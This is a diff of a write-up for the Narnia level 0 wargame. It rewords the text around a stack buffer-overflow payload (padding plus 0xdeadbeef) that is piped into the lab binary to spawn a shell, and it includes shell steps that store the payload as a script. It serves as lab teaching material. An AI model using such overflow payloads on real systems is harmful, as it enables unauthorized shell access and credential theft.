@@ -79,7 +79,8 @@ shell spawning. The below line of shell code aids us for this purpose.
 
     (echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat;)
 
-Its output need to be provided as input to the program `narnia0`. So, after running
+The output of the above command needs to be provided as input to the program `narnia0`. 
+So, after running it, one can grab the password for the next level.
 
     narnia0@gibson:/narnia$ mkdir /tmp/testDirectory && touch /tmp/testDirectory/exploit0.sh
     narnia0@gibson:/narnia$ echo "(echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat;)" > /tmp/testDirectory/exploit0.sh
